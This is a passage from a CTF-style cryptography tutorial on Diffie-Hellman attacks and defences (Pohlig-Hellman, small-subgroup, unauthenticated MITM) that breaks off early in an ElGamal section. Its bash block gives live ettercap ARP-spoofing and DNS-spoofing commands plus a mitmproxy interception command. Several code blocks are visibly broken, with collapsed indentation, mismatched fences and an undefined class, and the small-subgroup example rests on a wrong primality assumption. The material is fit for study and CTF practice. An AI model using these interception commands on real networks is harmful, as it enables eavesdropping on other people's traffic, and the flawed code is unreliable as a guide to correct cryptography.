Later (after receiving A, B):
Alice sends: A, nonce
Bob verifies: H(A || nonce) == commitment_A

If attacker modifies A between commitment and reveal,
Bob detects mismatch.
```

**3. Channel Binding (Cryptographic Binding):**

```
Derive session key: K = KDF(g^ab || "Channel_Binding_String")

Include channel identifier:
- TLS uses: master_secret derived from handshake_messages
- Custom: K = SHA-256(g^ab || MAC(Alice_public || Bob_public))

Any modification to exchanged keys changes session key.
Attacker cannot manipulate both forward direction and replay channel.
```

#### CTF Tools and Commands

**Authenticated DH Implementation:**

```python
from Crypto.Signature import DSS
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
import hashlib

class AuthenticatedDH:
    def __init__(self, dh_instance):
        self.dh = dh_instance
        self.signing_key = ECC.generate(curve='P-256')
        self.verifying_key = self.signing_key.publickey()
    
    def sign_public_key(self, public_key, peer_id, counter):
        """Sign DH public key to prevent MITM."""
        message = hashlib.sha256(
            str(public_key).encode() + peer_id.encode() + str(counter).encode()
        ).digest()
        
        signer = DSS.new(self.signing_key, 'fips-186-3')
        signature = signer.sign(message)
        
        return signature
    
    def verify_peer_signature(self, peer_public_key, signature, peer_public, peer_id, counter):
        """Verify peer's signature on public key."""
        message = hashlib.sha256(
            str(peer_public).encode() + peer_id.encode() + str(counter).encode()
        ).digest()
        
        verifier = DSS.new(peer_public_key, 'fips-186-3')
        try:
            verifier.verify(message, signature)
            print("[✓] Peer signature verified")
            return True
        except ValueError:
            print("[✗] Peer signature invalid (MITM detected?)")
            return False

# Usage
def authenticated_dh_exchange():
    dh = DiffieHellman(bits=1024)
    
    # Alice
    alice_auth_dh = AuthenticatedDH(dh)
    alice_private, alice_public = dh.generate_keypair()
    alice_sig = alice_auth_dh.sign_public_key(alice_public, "Bob", 1)
    
    # Bob
    bob_auth_dh = AuthenticatedDH(dh)
    bob_private, bob_public = dh.generate_keypair()
    bob_sig = bob_auth_dh.sign_public_key(bob_public, "Alice", 1)
    
    # Cross-verification
    print("[*] Alice verifying Bob's signature...")
    alice_auth_dh.verify_peer_signature(bob_auth_dh.verifying_key, bob_sig, bob_public, "Alice", 1)
    
    print("[*] Bob verifying Alice's signature...")
    bob_auth_dh.verify_peer_signature(alice_auth_dh.verifying_key, alice_sig, alice_public, "Bob", 1)
    
    # Compute shared secret
    alice_shared = dh.compute_shared_secret(alice_private, bob_public)
    bob_shared = dh.compute_shared_secret(bob_private, alice_public)
    
    assert alice_shared == bob_shared
    print(f"[✓] Shared secret established securely")

# authenticated_dh_exchange()
```

**Key Commitment Scheme:**

```python
import hashlib
import os

class KeyCommitmentDH:
    def __init__(self, dh_instance):
        self.dh = dh_instance
        self.commitment = None
        self.nonce = None
    
    def create_commitment(self, public_key):
        """Create commitment to public key."""
        self.nonce = os.urandom(32)
        self.commitment = hashlib.sha256(
            str(public_key).encode() + self.nonce
        ).digest()
        return self.commitment
    
    def reveal_commitment(self, public_key):
        """Reveal committed public key."""
        return public_key, self.nonce
    
    def verify_commitment(self, commitment, public_key, nonce):
        """Verify revealed commitment matches earlier commitment."""
        recomputed = hashlib.sha256(
            str(public_key).encode() + nonce
        ).digest()
        
        if recomputed == commitment:
            print("[✓] Commitment verified")
            return True
        else:
            print("[✗] Commitment mismatch (MITM detected)")
            return False

def key_commitment_exchange():
    dh = DiffieHellman(bits=1024)
    
    # Alice
    alice_commit = KeyCommitmentDH(dh)
    alice_private, alice_public = dh.generate_keypair()
    alice_commitment = alice_commit.create_commitment(alice_public)
    
    # Bob
    bob_commit = KeyCommitmentDH(dh)
    bob_private, bob_public = dh.generate_keypair()
    bob_commitment = bob_commit.create_commitment(bob_public)
    
    print("[*] Commitments exchanged")
    
    # Reveal phase
    alice_reveal, alice_nonce = alice_commit.reveal_commitment(alice_public)
    bob_reveal, bob_nonce = bob_commit.reveal_commitment(bob_public)
    
    print("[*] Verifying commitments...")
    alice_commit.verify_commitment(bob_commitment, bob_reveal, bob_nonce)
    bob_commit.verify_commitment(alice_commitment, alice_reveal, alice_nonce)
    
    # Compute shared secret
    alice_shared = dh.compute_shared_secret(alice_private, bob_public)
    bob_shared = dh.compute_shared_secret(bob_private, alice_public)
    
    assert alice_shared == bob_shared
    print("[✓] Key agreement with commitment protection successful")

# key_commitment_exchange()
```

**Channel Binding (Handshake Hashing):**

```python
def channel_binding_key_derivation(shared_secret, alice_public, bob_public):
    """
    Derive session key with channel binding to prevent MITM.
    Any modification to exchanged public keys changes derived key.
    """
    channel_id = hashlib.sha256(
        str(alice_public).encode() + str(bob_public).encode()
    ).digest()
    
    # Key derivation includes channel binding
    session_key = hashlib.sha256( str(shared_secret).encode() + channel_id + b"SESSION_KEY" ).digest()

return session_key, channel_id

def verify_channel_binding(session_key, alice_public, bob_public, claimed_channel_id): """Verify session key matches claimed channel.""" recomputed_channel_id = hashlib.sha256( str(alice_public).encode() + str(bob_public).encode() ).digest()

if recomputed_channel_id == claimed_channel_id:
    print("[✓] Channel binding verified")
    return True
else:
    print("[✗] Channel mismatch (MITM or key substitution detected)")
    return False

# Usage: derive key with binding

# session_key, channel_id = channel_binding_key_derivation(shared_secret, A, B)

# verify_channel_binding(session_key, A, B, channel_id)
````

**MITM Detection via Key Confirmation:**

```python
import hmac

class KeyConfirmation:
    def __init__(self, session_key):
        self.session_key = session_key
    
    def create_confirmation(self, initiator_id, responder_id, counter):
        """Create key confirmation message."""
        message = f"{initiator_id}_{responder_id}_{counter}".encode()
        confirmation = hmac.new(
            self.session_key, 
            message, 
            hashlib.sha256
        ).digest()
        return confirmation
    
    def verify_confirmation(self, confirmation, initiator_id, responder_id, counter):
        """Verify peer's key confirmation."""
        expected = self.create_confirmation(initiator_id, responder_id, counter)
        
        if hmac.compare_digest(confirmation, expected):
            print("[✓] Key confirmation valid (peer computed same session key)")
            return True
        else:
            print("[✗] Key confirmation mismatch (MITM or key agreement failure)")
            return False

def key_confirmation_exchange():
    dh = DiffieHellman(bits=1024)
    
    # Key agreement
    alice_private, alice_public = dh.generate_keypair()
    bob_private, bob_public = dh.generate_keypair()
    
    alice_shared = dh.compute_shared_secret(alice_private, bob_public)
    bob_shared = dh.compute_shared_secret(bob_private, alice_public)
    
    alice_session_key = dh.derive_key(alice_shared)
    bob_session_key = dh.derive_key(bob_shared)
    
    # Key confirmation
    alice_confirm = KeyConfirmation(alice_session_key)
    bob_confirm = KeyConfirmation(bob_session_key)
    
    alice_msg = alice_confirm.create_confirmation("Alice", "Bob", 1)
    bob_msg = bob_confirm.create_confirmation("Bob", "Alice", 1)
    
    print("[*] Exchanging key confirmations...")
    alice_confirm.verify_confirmation(bob_msg, "Bob", "Alice", 1)
    bob_confirm.verify_confirmation(alice_msg, "Alice", "Bob", 1)

# key_confirmation_exchange()
````

**Kali Linux: Real-World MITM Demonstration (ettercap):**

```bash
# [Educational purpose only]
# Install ettercap (network traffic interception tool)
sudo apt install ettercap-common ettercap-graphical

# List network interfaces
ifconfig

# Scan for hosts on network
sudo ettercap -T -q -i eth0 -n

# Perform ARP spoofing MITM (requires root)
# [Not recommended without explicit permission]
sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof -F filter.ef //10.0.0.5/ //10.0.0.1/

# Alternative: mitmproxy (HTTP/HTTPS proxy MITM)
sudo apt install mitmproxy
mitmproxy -m reverse:http://target.com/ --listen-port 8080
```

---

### CTF Attack Strategy for DH Challenges

**Step 1: Parameter Validation**

```python
def validate_dh_parameters(p, g, q=None):
    """
    Verify DH parameters for vulnerabilities.
    """
    from sympy import isprime, factorint
    
    print("[*] Validating DH parameters...")
    
    # Check p is prime
    if not isprime(p):
        print("[!] p is not prime (compromised)")
        return False
    print("[✓] p is prime")
    
    # Check g in valid range
    if not (1 < g < p):
        print("[!] g outside valid range")
        return False
    print("[✓] g in valid range (1 < g < p)")
    
    # Check if p-1 is smooth
    factors = factorint(p - 1)
    print(f"[*] Factors of p-1: {factors}")
    
    largest_factor = max(factors.keys())
    if largest_factor < 2**40:
        print(f"[!] VULNERABLE: p-1 smooth (largest factor {largest_factor.bit_length()} bits)")
        return False
    
    print(f"[✓] p-1 has large factors (largest {largest_factor.bit_length()} bits)")
    
    # Check g order (should divide p-1)
    g_order = multiplicative_order(g, p)
    if g_order == p - 1:
        print(f"[✓] g is generator (order = p-1)")
    elif g_order == (p - 1) // 2:
        print(f"[✓] g generates prime-order subgroup (order = (p-1)/2)")
    else: print(f"[!] g order is {g_order} (potential vulnerability)")

return True

def multiplicative_order(a, n): """Compute multiplicative order of a modulo n.""" from sympy import factorint

order = 1
result = a % n

while result != 1:
    result = (result * a) % n
    order += 1
    if order > n:  # Safety limit
        return None

return order

# validate_dh_parameters(p, g)
````

**Step 2: Vulnerability Assessment**

```bash
# Checklist for DH challenges:
# [ ] Check p bitlength (1024, 2048, 4096 bits expected)
# [ ] Factor p-1 (smooth = Pohlig-Hellman vulnerable)
# [ ] Check for safe prime (p = 2q+1, q prime)
# [ ] Verify g is generator or large-order element
# [ ] Check if multiple public keys available (CRT recovery possible)
# [ ] Look for repeated ephemeral keys (key reuse)
# [ ] Test for authentication (signatures, commitments, MAC)
# [ ] Identify KDF method (SHA-256 vs weak hash)
# [ ] Check for small subgroup confinement risk
# [ ] Verify no timing/padding oracle in verification
````

**Step 3: Targeted Exploitation**

```python
def dh_ctf_exploit_strategy(p, g, public_key, challenge_type):
    """
    Determine optimal exploitation path based on parameters.
    """
    from sympy import factorint
    
    factors = factorint(p - 1)
    largest_factor = max(factors.keys())
    
    print("[*] DH Exploitation Strategy:")
    
    # Strategy 1: Pohlig-Hellman (smooth p-1)
    if largest_factor < 2**50:
        print("\n[1] Pohlig-Hellman Attack (RECOMMENDED)")
        print(f"    - p-1 = {factors}")
        print(f"    - Largest factor: 2^{largest_factor.bit_length()}")
        print("    - Recover private key via CRT")
        return "pohlig_hellman"
    
    # Strategy 2: Brute Force (small p)
    if p.bit_length() < 32:
        print("\n[2] Brute Force Discrete Log")
        print(f"    - p bitlength: {p.bit_length()}")
        print(f"    - Complexity: O(2^{p.bit_length()//2})")
        return "brute_force"
    
    # Strategy 3: Pollard-Rho (large p, small subgroups)
    print("\n[3] Pollard-Rho Algorithm (Generic)")
    print(f"    - p bitlength: {p.bit_length()}")
    print(f"    - Complexity: O(√(p-1)) ≈ 2^{(p.bit_length()-1)//2}")
    print("    - Infeasible for large p")
    
    # Strategy 4: Small Subgroup Confinement
    print("\n[4] Small Subgroup Attack (If Multiple Sessions)")
    print(f"    - Requires: attacker controls ephemeral keys")
    print(f"    - Complexity per session: O(√max_small_factor)")
    return "small_subgroup"

# dh_ctf_exploit_strategy(p, g, public_key, "unknown")
```

**Step 4: MITM Detection and Exploitation**

```python
def detect_mitm_vulnerability(dh_exchange_trace):
    """
    Analyze DH exchange for MITM vulnerabilities.
    
    dh_exchange_trace: list of (sender, public_key, timestamp, metadata)
    """
    print("[*] Analyzing DH exchange for MITM vulnerability...")
    
    # Check 1: Signature presence
    has_signatures = any('signature' in str(m) for _, _, _, m in dh_exchange_trace)
    if not has_signatures:
        print("[!] No signatures detected: MITM possible")
    else:
        print("[✓] Signatures present: MITM harder")
    
    # Check 2: Authentication mechanism
    has_authentication = any(
        'auth' in str(m).lower() or 'confirm' in str(m).lower()
        for _, _, _, m in dh_exchange_trace
    )
    if not has_authentication:
        print("[!] No authentication: MITM vulnerability")
    else:
        print("[✓] Authentication mechanism detected")
    
    # Check 3: Key confirmation
    has_confirmation = any(
        'confirm' in str(m).lower() or 'mac' in str(m).lower()
        for _, _, _, m in dh_exchange_trace
    )
    if not has_confirmation:
        print("[!] No key confirmation: MITM vulnerability")
    else:
        print("[✓] Key confirmation detected")
    
    # Check 4: Counter/nonce to prevent replay
    has_freshness = any(
        'counter' in str(m).lower() or 'nonce' in str(m).lower()
        for _, _, _, m in dh_exchange_trace
    )
    if not has_freshness:
        print("[!] No freshness markers: Replay attack possible")
    else:
        print("[✓] Freshness tokens present")
    
    return not (has_signatures and has_authentication and has_confirmation and has_freshness)

# is_vulnerable = detect_mitm_vulnerability(dh_trace)
```

---

### Practical CTF Examples

**Example 1: Pohlig-Hellman Attack**

```python
def pohlig_hellman_ctf_example():
    """
    CTF Challenge: Recover private key from DH public key with smooth p-1.
    
    Given: p, g, y = g^x mod p
    Find: x
    """
    from sympy import factorint, isprime
    
    # Weak parameters (smooth p-1)
    p = 2 * 3 * 5 * 7 * 11 * 13 * 17 * 19 * 23 * 29 * 31 * 37 * 41 * 43 * 47 + 1
    
    # Verify p is prime
    if not isprime(p):
        print("[!] p is not prime")
        return None
    
    g = 2  # Generator
    
    # Secret (to recover)
    x_secret = 12345678
    y = pow(g, x_secret, p)
    
    print(f"[*] CTF Challenge:")
    print(f"[*] p = {p}")
    print(f"[*] g = {g}")
    print(f"[*] y = g^x mod p = {y}")
    print(f"[*] Find x")
    
    # Factor p-1
    factors = factorint(p - 1)
    print(f"\n[*] Factors of p-1: {factors}")
    
    # Pohlig-Hellman recovery
    congruences = []
    
    for prime, exponent in factors.items():
        order = prime ** exponent
        
        # Reduce to subgroup of order
        h = pow(g, (p - 1) // order, p)
        gamma = pow(y, (p - 1) // order, p)
        
        # Discrete log in small subgroup (brute force)
        for i in range(order):
            if pow(h, i, p) == gamma:
                congruences.append((i, order))
                print(f"[+] x ≡ {i} (mod {order})")
                break
    
    # Chinese Remainder Theorem
    from sympy import crt
    x_recovered = crt([c[0] for c in congruences], [c[1] for c in congruences])[0]
    
    print(f"\n[+] Recovered x: {x_recovered}")
    
    # Verify
    if pow(g, x_recovered, p) == y:
        print(f"[✓] Verification successful: x = {x_recovered}")
        return x_recovered
    else:
        print(f"[✗] Verification failed")
        return None

# recovered_key = pohlig_hellman_ctf_example()
```

**Example 2: Small Subgroup Confinement Attack**

```python
def small_subgroup_ctf_example():
    """
    CTF Challenge: Recover private key via small subgroup sessions.
    
    Scenario: Victim uses same long-term key across multiple sessions.
    Attacker sends crafted ephemeral keys to extract bits.
    """
    from sympy import factorint, isprime
    
    # Safe prime: p = 2q + 1
    q = 2**511 - 1  # Large prime
    p = 2 * q + 1
    
    # Safe primes have only subgroups of order 1, 2, q, 2q
    # Small subgroup: order 2
    
    # Victim's long-term keypair
    x_victim = 987654321  # Secret
    y_victim = pow(2, x_victim, p)
    
    print(f"[*] Small Subgroup Attack CTF Challenge")
    print(f"[*] Victim's public key y = {hex(y_victim)[:20]}...")
    
    # Attacker forces ephemeral key into order-2 subgroup
    # Order-2 elements: 1 and p-1
    ephemeral_values = [1, p - 1]
    
    print(f"\n[*] Order-2 subgroup elements: [1, p-1]")
    
    # Simulate sessions
    results = []
    
    for ephemeral in ephemeral_values:
        # Shared secret in subgroup
        shared = pow(y_victim, ephemeral, p)
        
        # Check if shared secret in small range (MITM observer)
        if shared == 1:
            results.append(1)
            print(f"[+] Session with ephemeral={ephemeral}: shared_secret=1")
        elif shared == p - 1:
            results.append(0)
            print(f"[+] Session with ephemeral={ephemeral}: shared_secret=p-1")
    
    # Recover bit of victim's key
    # If y_victim is quadratic residue: shared=1 when ephemeral=1
    # If y_victim is QNR: shared=p-1 when ephemeral=1
    
    print(f"\n[+] Recovered bits via small subgroup: {results}")
    print(f"[*] With all small subgroups: recover O(log(p)) bits per session")
    print(f"[*] Multiple sessions via CRT: full key recovery feasible")

# small_subgroup_ctf_example()
```

**Example 3: MITM Attack via Lack of Authentication**

```python
def mitm_ctf_example():
    """
    CTF Challenge: Perform MITM attack on unauthenticated DH exchange.
    
    Setup: Alice ↔ Attacker ↔ Bob (all communicate DH public keys)
    """
    dh = DiffieHellman(bits=512)  # Small for demo
    
    print("[*] Unauthenticated DH Exchange MITM")
    print("[*] Setup: Alice ↔ Attacker ↔ Bob\n")
    
    # Alice generates keypair
    alice_private, alice_public = dh.generate_keypair()
    print(f"[Alice] Generates keypair, public key = {hex(alice_public)[:20]}...")
    
    # Attacker generates keypair
    attacker_private1, attacker_public1 = dh.generate_keypair()
    attacker_private2, attacker_public2 = dh.generate_keypair()
    print(f"[Attacker] Generates keypair 1: {hex(attacker_public1)[:20]}...")
    print(f"[Attacker] Generates keypair 2: {hex(attacker_public2)[:20]}...")
    
    # Bob generates keypair
    bob_private, bob_public = dh.generate_keypair()
    print(f"[Bob] Generates keypair, public key = {hex(bob_public)[:20]}...\n")
    
    # DH Exchange without authentication
    print("[*] Public key exchange (MITM intercepts):")
    
    # Alice sends A, attacker intercepts and sends A' (attacker's key)
    print(f"[Alice → Bob] Sends public key")
    print(f"[Attacker] Intercepts, sends crafted public key instead\n")
    
    # Bob sends B, attacker intercepts and sends B' (attacker's key)
    print(f"[Bob → Alice] Sends public key")
    print(f"[Attacker] Intercepts, sends crafted public key instead\n")
    
    # Compute shared secrets
    alice_shared = dh.compute_shared_secret(alice_private, attacker_public2)  # Alice thinks she has Bob
    attacker_shared_alice = dh.compute_shared_secret(attacker_private2, alice_public)
    
    bob_shared = dh.compute_shared_secret(bob_private, attacker_public1)  # Bob thinks he has Alice
    attacker_shared_bob = dh.compute_shared_secret(attacker_private1, bob_public)
    
    print("[*] Shared secrets:")
    print(f"[Alice] thinks shared_secret with Bob = {hex(alice_shared)[:20]}...")
    print(f"[Attacker←Alice] shared_secret = {hex(attacker_shared_alice)[:20]}...")
    print(f"[Attacker←Bob] shared_secret = {hex(attacker_shared_bob)[:20]}...")
    print(f"[Bob] thinks shared_secret with Alice = {hex(bob_shared)[:20]}...\n")
    
    # Verify MITM success
    if alice_shared != bob_shared:
        print("[✓] MITM SUCCESSFUL!")
        print(f"[✓] Alice and Bob have DIFFERENT shared secrets")
        print(f"[✓] Attacker can decrypt Alice↔Bob traffic with different keys per direction")
        print(f"[✓] Attacker controls encryption/decryption")
    else:
        print("[✗] MITM FAILED: Alice and Bob detected each other")

# mitm_ctf_example()
```

---

### Complete DH CTF Exploitation Suite

```python
#!/usr/bin/env python3
"""
Diffie-Hellman CTF Exploitation Suite: Complete tools for DH vulnerability testing.
"""

from Crypto.Util.number import getPrime, inverse
from Crypto.Random.random import randbelow
from sympy import factorint, isprime, crt, primefactors
import hashlib

class DHExploitSuite:
    def __init__(self, bits=1024):
        self.bits = bits
        self.dh = DiffieHellman(bits=bits)
    
    def factor_analysis(self):
        """Analyze p-1 factorization."""
        p = self.dh.p
        factors = factorint(p - 1)
        
        print("[*] DH Parameter Analysis:")
        print(f"[*] p bitlength: {p.bit_length()}")
        print(f"[*] Factors of p-1: {factors}")
        
        largest = max(factors.keys())
        print(f"[*] Largest factor: {largest} (~{largest.bit_length()} bits)")
        
        if largest < 2**40:
            print("[!] VULNERABLE: Pohlig-Hellman attack feasible")
            return "pohlig_hellman"
        elif largest < 2**60:
            print("[!] WEAK: Discrete log computationally hard but possible")
            return "weak"
        else:
            print("[✓] SAFE: Factors too large for known attacks")
            return "safe"
    
    def pohlig_hellman_recover_key(self, y):
        """Recover private key via Pohlig-Hellman."""
        p = self.dh.p
        g = self.dh.g
        factors = factorint(p - 1)
        
        congruences = []
        
        for prime, exp in factors.items():
            order = prime ** exp
            
            if order.bit_length() > 40:  # Skip large factors
                continue
            
            h = pow(g, (p - 1) // order, p)
            gamma = pow(y, (p - 1) // order, p)
            
            # Discrete log in small subgroup
            x_i = self._discrete_log_small(h, gamma, order, p)
            if x_i is not None:
                congruences.append((x_i, order))
                print(f"[+] x ≡ {x_i} (mod {order})")
        
        if congruences:
            x = crt([c[0] for c in congruences], [c[1] for c in congruences])[0]
            return x
        return None
    
    def _discrete_log_small(self, h, gamma, order, p):
        """Brute force discrete log for small order."""
        for i in range(order):
            if pow(h, i, p) == gamma:
                return i
        return None
    
    def verify_key(self, x, y):
        """Verify private key."""
        if pow(self.dh.g, x, self.dh.p) == y:
            print("[✓] Private key verified!")
            return True
        else:
            print("[✗] Private key incorrect")
            return False
    
    def mitm_simulation(self):
        """Simulate MITM attack."""
        print("\n[*] MITM Simulation (Unauthenticated DH):")
        
        alice_private, alice_public = self.dh.generate_keypair()
        bob_private, bob_public = self.dh.generate_keypair()
        attacker_private1, attacker_public1 = self.dh.generate_keypair()
        attacker_private2, attacker_public2 = self.dh.generate_keypair()
        
        # Compute shared secrets
        alice_shared = self.dh.compute_shared_secret(alice_private, attacker_public2)
        bob_shared = self.dh.compute_shared_secret(bob_private, attacker_public1)
        attacker_shared_alice = self.dh.compute_shared_secret(attacker_private2, alice_public)
        attacker_shared_bob = self.dh.compute_shared_secret(attacker_private1, bob_public)
        
        print(f"[Alice] shared_secret (thinks Bob): {hex(alice_shared)[:20]}...")
        print(f"[Attacker] shared_secret ← Alice: {hex(attacker_shared_alice)[:20]}...")
        print(f"[Attacker] shared_secret ← Bob: {hex(attacker_shared_bob)[:20]}...")
        print(f"[Bob] shared_secret (thinks Alice): {hex(bob_shared)[:20]}...\n")
        
        if alice_shared != bob_shared and attacker_shared_alice != attacker_shared_bob:
            print("[✓] MITM SUCCESSFUL: Different keys for each direction")
            return True
        return False

# Usage
if __name__ == "__main__":
    suite = DHExploitSuite(bits=512)
    
    # Analyze vulnerability
    vuln_type = suite.factor_analysis()
    
    # Generate victim's key
    x_victim = randbelow(suite.dh.p - 2) + 2
    y_victim = pow(suite.dh.g, x_victim, suite.dh.p)
    
    # Attack
    if vuln_type == "pohlig_hellman":
        print("\n[*] Attempting Pohlig-Hellman recovery...\n")
        x_recovered = suite.pohlig_hellman_recover_key(y_victim)
        if x_recovered:
            suite.verify_key(x_recovered, y_victim)
    
    # MITM demo
    suite.mitm_simulation()
```

---

### CTF Checklist: Diffie-Hellman Challenges

```
PARAMETER VALIDATION:
[ ] Verify p is prime (isprime check)
[ ] Check p bitlength (1024, 2048, 4096 expected)
[ ] Verify 1 < g < p
[ ] Check g order (should be large, ideally p-1 or (p-1)/2)
[ ] Factor p-1 (smooth = vulnerable to Pohlig-Hellman)

VULNERABILITY ASSESSMENT:
[ ] Check if p-1 smooth (all factors < 2^40 = vulnerable)
[ ] Check if safe prime (p = 2q+1, q prime)
[ ] Verify generator order
[ ] Test for small subgroup confinement risk
[ ] Check for authentication (signatures, MAC)
[ ] Verify key commitment present
[ ] Look for channel binding
[ ] Analyze KDF (SHA-256 vs weak hash)

EXPLOITATION:
[ ] If smooth p-1: Pohlig-Hellman attack
[ ] If multiple public keys: CRT combination
[ ] If no authentication: MITM attack possible
[ ] If weak KDF: brute force session keys
[ ] If reused ephemeral keys: multi-session analysis

POST-EXPLOITATION:
[ ] Verify recovered key by recomputing shared secret
[ ] Decrypt intercepted messages if applicable
[ ] Check for flag in decrypted content
[ ] Validate solution against challenge requirements
```

---

### Advanced DH Topics (Theoretical)

**Index Calculus Algorithm (Large p):**

```python
def index_calculus_overview():
    """
    [Unverified] Index Calculus: probabilistic algorithm for discrete log
    over prime fields. Faster than Pollard-rho for large p.
    
    Complexity: L_p(1/3, 1.526...) where L_p(a,c) = exp(c*(ln p)^a * (ln ln p)^(1-a))
    For p~2^1024: faster than O(2^512) but still impractical.
    """
    print("[Unverified] Index Calculus (Large Prime Fields):")
    print("- Complexity: subexponential L_p(1/3, 1.526)")
    print("- Practical for p < 2^1024 in research settings")
    print("- Requires: precomputation phase (days), query phase (hours)")
    print("- Rarely applicable in CTF (time constraints)")

# index_calculus_overview()
```

**Number Field Sieve (Factoring p-1 components):**

```python
def number_field_sieve_overview():
    """
    [Unverified] NFS: fastest known factorization algorithm.
    If p-1 = r*s (r, s large), NFS factors this in subexponential time.
    
    Complexity: L_n(1/3, 1.902...)
    Practical for integers up to ~2^768 in research settings.
    """
    print("[Unverified] Number Field Sieve (Factorization):")
    print("- Complexity: L_n(1/3, 1.902)")
    print("- Practical for n up to 768 bits")
    print("- Impractical for CTF (requires weeks on clusters)")

# number_field_sieve_overview()
```

---

### Summary: DH Attack Decision Tree

```
DH Challenge (given p, g, y = g^x mod p, find x):

1. Factor p-1
   ├─ All factors < 2^40?
   │  └─ YES: Pohlig-Hellman (ATTACK!)
   │  └─ NO: Continue
   │
   ├─ p bitlength < 32?
   │  └─ YES: Brute force (feasible)
   │  └─ NO: Continue
   │
   ├─ Any factor == (p-1)/2 (safe prime)?
   │  └─ YES: Only small subgroups {1, 2, q}
   │         └─ Can test both: O(1) small subgroup check
   │  └─ NO: Multiple subgroups of varying sizes
   │
   ├─ Multiple public keys available?
   │  └─ YES: Try CRT combination of partial logs
   │  └─ NO: Continue
   │
   └─ No vulnerability found:
      └─ Discrete log hard (2^(p_bits/2))
      └─ Attack infeasible in time limit

2. Authentication check
   ├─ Signatures present?
   │  └─ YES: MITM harder
   │  └─ NO: MITM possible (forge any key)
   │
   ├─ Key commitment present?
   │  └─ YES: Point substitution detected
   │  └─ NO: Substitution possible
   │
   └─ Key confirmation messages?
      └─ YES: Session key tampering detected
      └─ NO: Session key can be forged

3. Small subgroup confinement
   ├─ Multiple sessions available?
   │  └─ YES: Attacker can send crafted ephemeral keys
   │         └─ Extract bits via oracle queries
   │  └─ NO: Attack infeasible
   │
   └─ Cofactor > 1?
      └─ YES: Small subgroups exist
      └─ NO: No cofactor attack possible
```

This completes the comprehensive Diffie-Hellman section covering classic DH, ECDH, small subgroup attacks, and MITM prevention with practical CTF exploitation strategies.

---

## ElGamal

### Encryption & Decryption

ElGamal is an asymmetric encryption scheme based on the Discrete Logarithm Problem (DLP). Unlike RSA which operates on modular arithmetic, ElGamal encryption relies on the computational difficulty of computing discrete logarithms in cyclic groups.

#### Mathematical Foundations

**Group Setup:**

ElGamal operates in a cyclic group with:

- **Prime modulus `p`**: Typically large (1024+ bits)
- **Generator `g`**: Element of multiplicative order `q` in `Z_p*`
- **Order `q`**: Prime factor of `p-1`

```python
def elgamal_group_setup(bits=1024):
    """
    Generate safe prime modulus for ElGamal
    A safe prime is p = 2q + 1 where both p and q are prime
    """
    from Crypto.Util.number import getPrime
    
    print("[ElGamal Group Setup]")
    print(f"Generating {bits}-bit safe prime...")
    
    # Generate prime q
    q = getPrime(bits - 1)
    
    # Generate safe prime p = 2q + 1
    p = 2 * q + 1
    while not is_prime(p):
        q = getPrime(bits - 1)
        p = 2 * q + 1
    
    print(f"p (modulus): {p}")
    print(f"q (order): {q}")
    
    # Find generator g
    # For safe prime, g = 2 often works (or find smallest element with order q)
    g = find_generator(p, q)
    
    print(f"g (generator): {g}")
    print(f"Order of g: {compute_order(g, p, q)}")
    
    return p, q, g

def is_prime(n):
    """Basic primality test"""
    if n < 2:
        return False
    if n == 2:
        return True
    if n % 2 == 0:
        return False
    
    from Crypto.Util.number import isPrime
    return isPrime(n)

def find_generator(p, q):
    """
    Find generator of order q in Z_p*
    For safe prime p = 2q + 1, try small values
    """
    for g in range(2, p):
        # Check: g^q mod p = 1 and g^2 mod p ≠ 1
        if pow(g, q, p) == 1 and pow(g, 2, p) != 1:
            return g
    
    return None

def compute_order(g, p, q):
    """Verify order of generator g"""
    return pow(g, q, p) == 1
```

#### Key Generation

**Public/Private Key Pair:**

```python
def elgamal_key_generation(p, q, g):
    """
    Generate ElGamal key pair
    """
    import os
    
    print("[ElGamal Key Generation]")
    
    # Private key: x ∈ [1, q-1]
    x = int.from_bytes(os.urandom(16), 'big') % (q - 1) + 1
    
    # Public key: y = g^x mod p
    y = pow(g, x, p)
    
    public_key = {
        'p': p,
        'q': q,
        'g': g,
        'y': y
    }
    
    private_key = {
        'x': x,
        'p': p,
        'q': q,
        'g': g,
    }
    
    print(f"Private key x: {x}")
    print(f"Public key y: g^x mod p = {y}")
    
    return public_key, private_key
```

#### ElGamal Encryption

**Encryption Process:**

To encrypt plaintext `m` for recipient with public key `(p, q, g, y)`:

1. Choose random `k ∈ [1, q-1]`
2. Compute `c1 = g^k mod p`
3. Compute `s = y^k mod p` (shared secret)
4. Encrypt: `c2 = m · s mod p`
5. Ciphertext: `(c1, c2)`

```python
def elgamal_encrypt(plaintext, public_key):
    """
    Encrypt plaintext using ElGamal
    plaintext: integer m < p
    public_key: dict with 'p', 'q', 'g', 'y'
    """
    import os
    from math import gcd
    
    p = public_key['p']
    q = public_key['q']
    g = public_key['g']
    y = public_key['y']
    
    print("[ElGamal Encryption]")
    print(f"Plaintext: {plaintext}")
    
    # Choose random k
    k = int.from_bytes(os.urandom(16), 'big') % (q - 1) + 1
    
    print(f"Random k: {k}")
    
    # Compute c1 = g^k mod p
    c1 = pow(g, k, p)
    
    # Compute shared secret s = y^k mod p
    s = pow(y, k, p)
    
    # Encrypt: c2 = m · s mod p
    c2 = (plaintext * s) % p
    
    ciphertext = (c1, c2)
    
    print(f"c1 (g^k mod p): {c1}")
    print(f"Shared secret s (y^k mod p): {s}")
    print(f"c2 (m·s mod p): {c2}")
    
    return ciphertext
```

#### ElGamal Decryption

**Decryption Process:**

To decrypt ciphertext `(c1, c2)` using private key `x`:

1. Compute `s = c1^x mod p` (recover shared secret)
2. Compute `s^{-1} mod p` (modular inverse)
3. Decrypt: `m = c2 · s^{-1} mod p`

```python
def elgamal_decrypt(ciphertext, private_key):
    """
    Decrypt ElGamal ciphertext
    ciphertext: tuple (c1, c2)
    private_key: dict with 'x', 'p'
    """
    c1, c2 = ciphertext
    x = private_key['x']
    p = private_key['p']
    
    print("[ElGamal Decryption]")
    print(f"Ciphertext: ({c1}, {c2})")
    print(f"Private key x: {x}")
    
    # Recover shared secret: s = c1^x mod p
    s = pow(c1, x, p)
    
    print(f"Recovered shared secret s (c1^x mod p): {s}")
    
    # Compute modular inverse s^{-1} mod p
    s_inv = pow(s, -1, p)
    
    print(f"Modular inverse s^{-1} mod p: {s_inv}")
    
    # Decrypt: m = c2 · s^{-1} mod p
    m = (c2 * s_inv) % p
    
    print(f"Plaintext: {m}")
    
    return m
```

**Verification:**

```python
def verify_elgamal_encryption():
    """Complete ElGamal encryption/decryption example"""
    
    print("[ElGamal Encryption/Decryption Verification]\n")
    
    # Setup
    from Crypto.Util.number import getPrime
    
